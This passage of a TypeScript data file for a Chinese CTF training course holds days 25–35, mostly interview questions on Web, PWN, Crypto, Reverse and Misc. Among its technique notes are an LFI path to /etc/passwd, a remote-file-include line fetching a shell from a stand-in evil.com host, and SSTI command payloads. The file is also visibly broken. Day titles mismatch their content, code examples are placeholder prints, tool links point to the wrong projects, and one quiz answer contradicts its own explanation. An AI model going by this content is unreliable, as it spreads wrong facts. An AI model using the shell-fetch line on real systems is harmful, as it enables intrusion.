    content: '# CTF进阶路线\n\n**入门阶段(1-3个月)：**\n- Web基础(SQL注入、XSS、文件上传)\n- Crypto基础(古典密码、RSA基础)\n- Misc基础(隐写、编码)\n\n**进阶阶段(3-6个月)：**\n- PWN基础(栈溢出、格式化字符串)\n- Reverse基础(静态分析、动态调试)\n- Web进阶(反序列化、SSTI)\n\n**高级阶段(6-12个月)：**\n- PWN高级(ROP、堆漏洞)\n- Reverse高级(反混淆、VM保护)\n- Crypto高级(复杂RSA攻击、侧信道)',
    quiz: [q('CTF入门阶段应该学习什么？',['PWN高级技术','Web基础漏洞','Reverse反混淆','Crypto侧信道'],1,'入门阶段应该学习Web基础漏洞'),q('CTF高级阶段需要多长时间？',['1-3个月','3-6个月','6-12个月','1-2年'],2,'高级阶段通常需要6-12个月')],
    codeExamples: [{ title: '路径绕过与编码绕过示例代码', language: 'python', code: '# 路径绕过与编码绕过 - Day 25\n# CTF web方向实战\nprint("CTF web实战")', explanation: '路径绕过与编码绕过核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '路径绕过与编码绕过核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '路径绕过与编码绕过辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '路径绕过与编码绕过常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '路径绕过与编码绕过实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择路径绕过与编码绕过相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握路径绕过与编码绕过的基本解题方法' }],
    resources: [
      { name: '路径绕过与编码绕过学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '路径绕过与编码绕过实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '路径绕过与编码绕过专家', title: '路径绕过与编码绕过学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r26', day: 26, title: '命令执行入门',
    subtitle: '命令执行·基础命令注入',
    objectives: ['回顾CTF知识体系'],
    keyPoints: ['总结','回顾','展望'],
    content: '# CTF总结与回顾\n\n**知识体系：**\n- Web：SQL注入、XSS、文件上传、SSRF、反序列化、SSTI\n- PWN：栈溢出、格式化字符串、ROP、堆漏洞、Shellcode\n- Crypto：古典密码、RSA、AES、哈希、侧信道\n- Reverse：静态分析、动态调试、反混淆、Frida\n- Misc：隐写、流量分析、编码、取证\n\n**能力要求：**\n- 编程能力(Python/C/C++/JavaScript)\n- 网络知识(TCP/IP、HTTP)\n- 操作系统知识(Linux/Windows)\n- 密码学知识\n- 逆向思维',
    quiz: [q('CTF的五个主要方向是什么？',['Web、PWN、Crypto、Reverse、Misc','前端、后端、数据库、网络、安全','开发、测试、运维、安全、管理','编程、算法、数据结构、网络、安全'],0,'CTF五个主要方向是Web、PWN、Crypto、Reverse、Misc'),q('CTF需要哪些编程能力？',['Python/C/C++/JavaScript','仅Python','仅C++','仅Java'],0,'CTF需要Python/C/C++/JavaScript等编程能力')],
    codeExamples: [{ title: '命令执行入门示例代码', language: 'python', code: '# 命令执行入门 - Day 26\n# CTF web方向实战\nprint("CTF web实战")', explanation: '命令执行入门核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '命令执行入门核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '命令执行入门辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '命令执行入门常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '命令执行入门实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择命令执行入门相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握命令执行入门的基本解题方法' }],
    resources: [
      { name: '命令执行入门学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '命令执行入门实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '命令执行入门专家', title: '命令执行入门学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  }
];

const reviewDays = mergeEvenly(ctfReviewDays, 26);

const interviewDays: CyberDay[] = [
  {
    id: 'interview-ctf-i27', day: 27, title: 'RCE空格与黑名单绕过', subtitle: 'CTF经历·技能·实战',
    objectives: ['回答CTF相关面试问题'],
    keyPoints: ['CTF经历','技术方向','解题能力','团队协作'],
    content: '# CTF竞赛面试 20 问\n\n**Q1: 你参加过哪些CTF比赛？**\n回答要点：比赛名称、时间、成绩、团队角色。\n\n**Q2: CTF中你最擅长什么方向？**\n回答要点：具体方向、掌握的技能、解决过的典型题目。\n\n**Q3: 讲一个你印象最深的CTF题目？**\n用STAR法则：题目描述、解题思路、遇到的困难、如何解决。\n\n**Q4: CTF经历对你的安全能力有什么帮助？**\n技术提升、思维训练、团队协作、问题解决能力。\n\n**Q5: 你如何学习CTF？**\n刷题、看题解、写WriteUp、参加比赛、团队交流。\n\n**Q6: CTF中遇到不会的题目怎么办？**\n分析题目类型、尝试常见解法、求助队友、赛后学习题解。\n\n**Q7: 你在CTF团队中担任什么角色？**\n负责方向、团队协作、沟通方式、贡献。\n\n**Q8: CTF和渗透测试有什么区别？**\nCTF是解题比赛，渗透测试是实战；CTF注重技巧，渗透测试注重流程。\n\n**Q9: 你有什么CTF相关的项目或作品？**\nGitHub仓库、博客、WriteUp、工具开发。\n\n**Q10: 你未来在CTF方面有什么计划？**\n参加更多高级别竞赛、提升技术水平、帮助团队成长。',
    quiz: [q('CTF中PWN方向主要考察什么？',['Web漏洞','二进制漏洞利用','密码学','隐写术'],1,'PWN=二进制漏洞利用，考察栈溢出、ROP、堆漏洞等'),q('CTF中最常见的Web题目类型？',['文件下载','SQL注入','文件查看','页面浏览'],1,'SQL注入是CTF Web题目中最常见的类型')],
    codeExamples: [{ title: 'RCE空格与黑名单绕过示例代码', language: 'python', code: '# RCE空格与黑名单绕过 - Day 27\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'RCE空格与黑名单绕过核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'RCE空格与黑名单绕过核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'RCE空格与黑名单绕过辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'RCE空格与黑名单绕过常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'RCE空格与黑名单绕过实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择RCE空格与黑名单绕过相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握RCE空格与黑名单绕过的基本解题方法' }],
    resources: [
      { name: 'RCE空格与黑名单绕过学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'RCE空格与黑名单绕过实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'RCE空格与黑名单绕过专家', title: 'RCE空格与黑名单绕过学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'interview-ctf-i28', day: 28, title: 'Misc文件头修复', subtitle: 'Web漏洞·代码审计·解题思路',
    objectives: ['回答Web方向面试题'],
    keyPoints: ['SQL注入','XSS','文件上传','反序列化','SSTI'],
    content: '# CTF Web面试题\n\n**Q1: SQL注入有哪些类型？如何利用？**\n联合查询注入、布尔盲注、时间盲注、报错注入、堆叠注入。利用：构造恶意SQL语句，获取数据库信息或执行命令。\n\n**Q2: XSS有哪些类型？如何防御？**\n反射型、存储型、DOM型。防御：输出编码、CSP、HttpOnly Cookie、输入验证。\n\n**Q3: 文件上传漏洞如何利用？**\n绕过前端校验、修改Content-Type、双扩展名、.htaccess配置、图片马+解析漏洞。\n\n**Q4: 反序列化漏洞如何挖掘和利用？**\n挖掘：查找可反序列化的输入点，分析反序列化链。利用：构造恶意对象，触发危险操作。\n\n**Q5: SSTI模板注入原理和利用？**\n原理：模板引擎将用户输入作为模板代码执行。利用：通过模板语法执行系统命令或读取文件。\n\n**Q6: SSRF如何利用？**\n访问内网服务、打Redis、读取本地文件、端口扫描。\n\n**Q7: 文件包含漏洞分类和利用？**\nLFI(本地文件包含)：../../etc/passwd。RFI(远程文件包含)：http://evil.com/shell.txt。php://filter读取源码。',
    quiz: [q('SQL盲注中时间盲注常用什么函数？',['sleep()','wait()','delay()','pause()'],0,'时间盲注常用sleep()函数延迟执行'),q('SSTI中Jinja2模板的常用payload？',['{{1+1}}','{{config}}','{{eval("1+1")}}','{{system("ls")}}'],1,'{{config}}可以查看配置信息，是SSTI入门payload')],
    codeExamples: [{ title: 'Misc文件头修复示例代码', language: 'python', code: '# Misc文件头修复 - Day 28\n# CTF misc方向实战\nprint("CTF misc实战")', explanation: 'Misc文件头修复核心代码示例' }],
    recommendedTools: [
      { name: 'binwalk', description: 'Misc文件头修复核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Wireshark', description: 'Misc文件头修复辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'exiftool', description: 'Misc文件头修复常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'Misc文件头修复实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择Misc文件头修复相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握Misc文件头修复的基本解题方法' }],
    resources: [
      { name: 'Misc文件头修复学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'Misc文件头修复实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'Misc文件头修复专家', title: 'Misc文件头修复学习建议', content: 'Misc方向最杂最考验综合能力：1)工具熟练（binwalk/exiftool/Wireshark）2)善于观察细节 3)广泛的知识储备 4)能写自动化分析脚本。Misc题往往是比赛中拉开分数的关键。', url: '' }]
  },
  {
    id: 'interview-ctf-i29', day: 29, title: '流量包分析', subtitle: '二进制漏洞·ROP·栈溢出',
    objectives: ['回答PWN方向面试题'],
    keyPoints: ['栈溢出','格式化字符串','ROP','堆漏洞','Shellcode'],
    content: '# CTF PWN面试题\n\n**Q1: 栈溢出漏洞原理？**\n缓冲区溢出覆盖返回地址，跳转到恶意代码。条件：无栈保护(Canary)、数据段可执行(NX关闭)、地址可预测(ASLR关闭)。\n\n**Q2: Canary保护如何绕过？**\n泄露Canary值、栈迁移、利用格式化字符串覆盖、利用漏洞绕过。\n\n**Q3: ROP链如何构造？**\n寻找可用的gadget(返回指令)，链接成链实现代码执行。工具：ROPgadget、pwntools。\n\n**Q4: 格式化字符串漏洞原理和利用？**\n原理：printf函数的格式化参数可控。利用：泄露栈地址、写内存、执行代码。\n\n**Q5: 堆漏洞有哪些类型？**\nUse-After-Free、Double Free、Fastbin Attack、Tcache Poisoning、Unsorted Bin Attack。\n\n**Q6: Shellcode如何编写？**\n编写汇编代码，编译成机器码，注入到程序中执行。注意：避免NULL字节、考虑平台和架构。',
    quiz: [q('Canary保护的作用是什么？',['防止栈溢出','防止堆溢出','防止格式化字符串','防止ROP'],0,'Canary在栈上放置随机值，检测栈溢出'),q('ROP链的核心是什么？',['Shellcode','Gadget链接','格式化字符串','堆溢出'],1,'ROP通过链接多个gadget实现任意代码执行')],
    codeExamples: [{ title: '流量包分析示例代码', language: 'python', code: '# 流量包分析 - Day 29\n# CTF misc方向实战\nprint("CTF misc实战")', explanation: '流量包分析核心代码示例' }],
    recommendedTools: [
      { name: 'binwalk', description: '流量包分析核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Wireshark', description: '流量包分析辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'exiftool', description: '流量包分析常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '流量包分析实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择流量包分析相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握流量包分析的基本解题方法' }],
    resources: [
      { name: '流量包分析学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '流量包分析实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '流量包分析专家', title: '流量包分析学习建议', content: 'Misc方向最杂最考验综合能力：1)工具熟练（binwalk/exiftool/Wireshark）2)善于观察细节 3)广泛的知识储备 4)能写自动化分析脚本。Misc题往往是比赛中拉开分数的关键。', url: '' }]
  },
  {
    id: 'interview-ctf-i30', day: 30, title: '第四周总复盘', subtitle: '密码学·RSA·AES·哈希',
    objectives: ['回答Crypto方向面试题'],
    keyPoints: ['古典密码','RSA','AES','哈希','侧信道'],
    content: '# CTF Crypto面试题\n\n**Q1: RSA加密和解密过程？**\n加密：c = m^e mod n。解密：m = c^d mod n。其中n=pq，d是e关于φ(n)的逆元。\n\n**Q2: RSA常见攻击方法？**\n小指数攻击(e=3)、共模攻击、低加密指数广播攻击、CRT攻击、私钥泄露、因数分解。\n\n**Q3: AES加密模式有哪些？各有什么特点？**\nECB：相同明文相同密文，不安全。CBC：需要IV，加密块依赖前一块。GCM：认证加密，提供完整性。\n\n**Q4: 古典密码有哪些？如何破解？**\n凯撒密码(位移破解)、维吉尼亚密码(频率分析)、栅栏密码(尝试不同行数)、摩尔斯电码(查表)。\n\n**Q5: 哈希函数有什么特点？常见攻击？**\n特点：单向性、抗碰撞性、雪崩效应。攻击：碰撞攻击(MD5/SHA1)、长度扩展攻击、哈希截断。\n\n**Q6: 侧信道攻击有哪些类型？**\n计时攻击、差分功耗分析(DPA)、电磁分析(EMA)、故障注入攻击。',
    quiz: [q('RSA中e=3的小指数攻击原理？',['分解n','计算d','直接开方','碰撞攻击'],2,'e=3时c=m^3，可直接开立方根得到m'),q('AES的哪个模式不安全？',['CBC','GCM','ECB','CTR'],2,'ECB模式相同明文产生相同密文，不安全')],
    codeExamples: [{ title: '第四周总复盘示例代码', language: 'python', code: '# 第四周总复盘 - Day 30\n# CTF misc方向实战\nprint("CTF misc实战")', explanation: '第四周总复盘核心代码示例' }],
    recommendedTools: [
      { name: 'binwalk', description: '第四周总复盘核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Wireshark', description: '第四周总复盘辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'exiftool', description: '第四周总复盘常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '第四周总复盘实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择第四周总复盘相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握第四周总复盘的基本解题方法' }],
    resources: [
      { name: '第四周总复盘学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '第四周总复盘实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '第四周总复盘专家', title: '第四周总复盘学习建议', content: 'Misc方向最杂最考验综合能力：1)工具熟练（binwalk/exiftool/Wireshark）2)善于观察细节 3)广泛的知识储备 4)能写自动化分析脚本。Misc题往往是比赛中拉开分数的关键。', url: '' }]
  },
  {
    id: 'interview-ctf-i31', day: 31, title: '攻防世界Web新手区(上)', subtitle: '逆向工程·反混淆·调试',
    objectives: ['回答Reverse方向面试题'],
    keyPoints: ['静态分析','动态调试','反混淆','Frida','VM保护'],
    content: '# CTF Reverse面试题\n\n**Q1: 静态分析和动态分析的区别？**\n静态分析：不运行程序，通过反汇编分析代码逻辑。动态分析：运行程序，通过调试器观察执行过程。\n\n**Q2: IDA Pro常用功能？**\n反汇编、伪代码、交叉引用、函数图、字符串搜索、脚本编写。\n\n**Q3: 反混淆技术有哪些？**\n去除花指令、还原控制流、消除字符串加密、OLLVM还原、VMProtect分析。\n\n**Q4: Frida动态插桩的用途？**\nHook函数、修改参数和返回值、内存搜索、追踪执行流程、绕过检测。\n\n**Q5: VM保护如何分析？**\n识别虚拟机指令、还原虚拟指令到真实指令、分析VM结构、编写解VM脚本。\n\n**Q6: Android逆向流程？**\nAPK反编译(dex2jar)、Java代码分析(jadx-gui)、Frida Hook、Smali修改、重打包。',
    quiz: [q('IDA Pro中查看伪代码的快捷键？',['F5','F7','F9','F10'],0,'F5键将汇编转换为伪代码'),q('Frida主要用于什么？',['静态分析','动态插桩','反汇编','哈希计算'],1,'Frida是动态插桩工具，用于Hook和修改程序行为')],
    codeExamples: [{ title: '攻防世界Web新手区(上)示例代码', language: 'python', code: '# 攻防世界Web新手区(上) - Day 31\n# CTF web方向实战\nprint("CTF web实战")', explanation: '攻防世界Web新手区(上)核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '攻防世界Web新手区(上)核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '攻防世界Web新手区(上)辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '攻防世界Web新手区(上)常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '攻防世界Web新手区(上)实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择攻防世界Web新手区(上)相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握攻防世界Web新手区(上)的基本解题方法' }],
    resources: [
      { name: '攻防世界Web新手区(上)学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '攻防世界Web新手区(上)实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '攻防世界Web新手区(上)专家', title: '攻防世界Web新手区(上)学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'interview-ctf-i32', day: 32, title: '攻防世界Web新手区(下)', subtitle: '隐写术·流量分析·取证',
    objectives: ['回答Misc方向面试题'],
    keyPoints: ['隐写术','流量分析','编码','取证','压缩包'],
    content: '# CTF Misc面试题\n\n**Q1: 隐写术有哪些类型？如何检测？**\n图片隐写(LSB、Steghide)、音频隐写(频谱分析)、文件隐写(压缩包)。检测：binwalk、exiftool、zsteg。\n\n**Q2: Wireshark如何分析流量？**\n过滤规则(http.request、tcp.port)、追踪流(Follow TCP Stream)、导出对象、提取文件。\n\n**Q3: 常见的编码方式有哪些？**\nBase64/Base32/Base58、URL编码、HTML实体编码、Unicode编码、进制转换、Brainfuck。\n\n**Q4: 文件取证常用工具？**\ntestdisk/photorec(文件恢复)、volatility(内存分析)、regripper(注册表)、foremost(文件雕刻)。\n\n**Q5: 压缩包密码如何破解？**\n使用John the Ripper或hashcat，配合字典文件(rockyou.txt)。伪加密修改压缩包头部。\n\n**Q6: DNS隧道数据如何提取？**\n分析DNS查询记录，提取子域名或TXT记录中的数据。工具：dnscat2、iodine。',
    quiz: [q('LSB隐写的原理是什么？',['修改图片像素的最低有效位','修改图片大小','修改图片格式','修改图片颜色'],0,'LSB=最低有效位，将隐藏数据嵌入像素的最低位'),q('Wireshark中追踪TCP流的快捷键？',['Ctrl+F','Ctrl+T','Ctrl+Shift+F','Ctrl+Shift+T'],1,'Ctrl+Shift+F打开追踪流窗口')],
    codeExamples: [{ title: '攻防世界Web新手区(下)示例代码', language: 'python', code: '# 攻防世界Web新手区(下) - Day 32\n# CTF web方向实战\nprint("CTF web实战")', explanation: '攻防世界Web新手区(下)核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '攻防世界Web新手区(下)核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '攻防世界Web新手区(下)辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '攻防世界Web新手区(下)常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '攻防世界Web新手区(下)实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择攻防世界Web新手区(下)相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握攻防世界Web新手区(下)的基本解题方法' }],
    resources: [
      { name: '攻防世界Web新手区(下)学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '攻防世界Web新手区(下)实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '攻防世界Web新手区(下)专家', title: '攻防世界Web新手区(下)学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'interview-ctf-i33', day: 33, title: '攻防世界Misc新手区(上)', subtitle: 'pwntools·IDA·GDB·Wireshark',
    objectives: ['回答工具相关面试题'],
    keyPoints: ['pwntools','IDA','GDB','Wireshark','hashcat'],
    content: '# CTF工具链面试题\n\n**Q1: pwntools的常用功能？**\n连接远程/本地程序、发送/接收数据、构造payload、ROP链、shellcode。\n\n**Q2: IDA Pro的使用技巧？**\n伪代码转换(F5)、交叉引用(X)、函数图(V)、脚本编写、字符串搜索(Shift+F12)。\n\n**Q3: GDB调试常用命令？**\nb(断点)、run(运行)、ni(下一步)、si(单步进入)、info registers(寄存器)、x(内存)、c(继续)。\n\n**Q4: Wireshark过滤规则？**\nhttp.request(HTTP请求)、tcp.port==80(端口)、ip.addr==192.168.1.1(IP)、dns.qry.name(域名)。\n\n**Q5: hashcat常用参数？**\n-m(哈希类型)、-a(攻击模式)、-o(输出文件)、--force(忽略警告)。\n\n**Q6: 如何编写CTF自动化脚本？**\n确定功能、设计结构、编写代码、测试验证、优化改进。常用语言：Python。',
    quiz: [q('pwntools中连接远程服务器的函数？',['process()','remote()','connect()','socket()'],1,'remote(host, port)连接远程服务器'),q('IDA Pro中搜索字符串的快捷键？',['Ctrl+F','Shift+F12','F12','Ctrl+S'],1,'Shift+F12搜索字符串')],
    codeExamples: [{ title: '攻防世界Misc新手区(上)示例代码', language: 'python', code: '# 攻防世界Misc新手区(上) - Day 33\n# CTF pwn方向实战\nprint("CTF pwn实战")', explanation: '攻防世界Misc新手区(上)核心代码示例' }],
    recommendedTools: [
      { name: 'pwntools', description: '攻防世界Misc新手区(上)核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Ghidra', description: '攻防世界Misc新手区(上)辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'pwndbg', description: '攻防世界Misc新手区(上)常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '攻防世界Misc新手区(上)实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择攻防世界Misc新手区(上)相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握攻防世界Misc新手区(上)的基本解题方法' }],
    resources: [
      { name: '攻防世界Misc新手区(上)学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '攻防世界Misc新手区(上)实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '攻防世界Misc新手区(上)专家', title: '攻防世界Misc新手区(上)学习建议', content: 'PWN方向需要扎实的计算机基础：1)理解CPU架构和汇编语言 2)理解Linux内存布局 3)熟练使用GDB动态调试 4)掌握pwntools编写exp。入门较难但掌握后就是核心竞争力。', url: '' }]
  },
  {
    id: 'interview-ctf-i34', day: 34, title: '攻防世界Misc新手区(下)', subtitle: '分工·沟通·策略',
    objectives: ['回答团队协作面试题'],
    keyPoints: ['分工','沟通','策略','心态'],
    content: '# CTF团队协作面试题\n\n**Q1: CTF团队如何分工？**\n按方向分工：Web手、PWN手、Crypto手、Reverse手、Misc手。每人专注1-2个方向。\n\n**Q2: 团队沟通方式？**\n即时沟通(Discord/Slack)、共享文档(记录解题思路)、CTF平台协作、赛后复盘。\n\n**Q3: 遇到难题如何求助？**\n描述问题、提供思路、展示尝试过的方法、请求队友帮助。\n\n**Q4: 团队比赛策略？**\n快速浏览题目、先做简单题、合理分配时间、保持沟通、赛后总结。\n\n**Q5: 如何处理团队冲突？**\n冷静沟通、理性分析、尊重意见、寻求共识。\n\n**Q6: 你在团队中担任什么角色？**\n举例说明：Web手，负责Web题目，同时协助其他方向。',
    quiz: [q('CTF团队中Web手的主要职责？',['二进制漏洞','密码学题目','Web漏洞题目','隐写术'],2,'Web手负责Web漏洞题目：SQL注入、XSS、文件上传等'),q('团队比赛中优先做什么题目？',['难题','高分题','低分题','新题'],1,'优先做高分题，提高得分效率')],
    codeExamples: [{ title: '攻防世界Misc新手区(下)示例代码', language: 'python', code: '# 攻防世界Misc新手区(下) - Day 34\n# CTF pwn方向实战\nprint("CTF pwn实战")', explanation: '攻防世界Misc新手区(下)核心代码示例' }],
    recommendedTools: [
      { name: 'pwntools', description: '攻防世界Misc新手区(下)核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Ghidra', description: '攻防世界Misc新手区(下)辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'pwndbg', description: '攻防世界Misc新手区(下)常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '攻防世界Misc新手区(下)实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择攻防世界Misc新手区(下)相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握攻防世界Misc新手区(下)的基本解题方法' }],
    resources: [
      { name: '攻防世界Misc新手区(下)学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '攻防世界Misc新手区(下)实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '攻防世界Misc新手区(下)专家', title: '攻防世界Misc新手区(下)学习建议', content: 'PWN方向需要扎实的计算机基础：1)理解CPU架构和汇编语言 2)理解Linux内存布局 3)熟练使用GDB动态调试 4)掌握pwntools编写exp。入门较难但掌握后就是核心竞争力。', url: '' }]
  },
  {
    id: 'interview-ctf-i35', day: 35, title: '新手区全量通关(上)', subtitle: '比赛经历·解题思路·收获',
    objectives: ['回答实战经验面试题'],
    keyPoints: ['比赛经历','解题思路','收获','成长'],
    content: '# CTF实战经验面试题\n\n**Q1: 描述一次你印象最深的CTF比赛经历？**\n使用STAR法则：比赛背景、遇到的问题、解决方法、结果和收获。\n\n**Q2: 你在CTF中解决过最难的题目是什么？**\n描述题目、解题过程、遇到的困难、如何克服、收获。\n\n**Q3: CTF经历对你的技术成长有什么帮助？**\n技术提升、思维训练、问题解决能力、团队协作、学习能力。\n\n**Q4: 你从CTF中学到了什么？**\n安全知识、编程能力、逆向思维、时间管理、团队协作。\n\n**Q5: CTF中你犯过什么错误？如何改进？**\n举例说明：粗心错误、时间管理问题、沟通问题。改进方法：仔细检查、合理规划、加强沟通。\n\n**Q6: 你如何准备CTF比赛？**\n刷题训练、整理脚本、团队协作、心态调整、工具准备。',
    quiz: [q('CTF中最重要的能力是什么？',['编程能力','学习能力','记忆力','打字速度'],1,'学习能力最重要，CTF需要不断学习新知识和技巧'),q('CTF比赛中时间管理的关键是什么？',['快速做题','先做难题','合理分配','保持速度'],2,'合理分配时间，优先做高分题，限时解决难题')],
    codeExamples: [{ title: '新手区全量通关(上)示例代码', language: 'python', code: '# 新手区全量通关(上) - Day 35\n# CTF misc方向实战\nprint("CTF misc实战")', explanation: '新手区全量通关(上)核心代码示例' }],
    recommendedTools: [
      { name: 'binwalk', description: '新手区全量通关(上)核心工具', url: 'https://github.com', type: 'local' },
      { name: 'Wireshark', description: '新手区全量通关(上)辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'exiftool', description: '新手区全量通关(上)常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '新手区全量通关(上)实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择新手区全量通关(上)相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握新手区全量通关(上)的基本解题方法' }],
    resources: [
      { name: '新手区全量通关(上)学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '新手区全量通关(上)实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
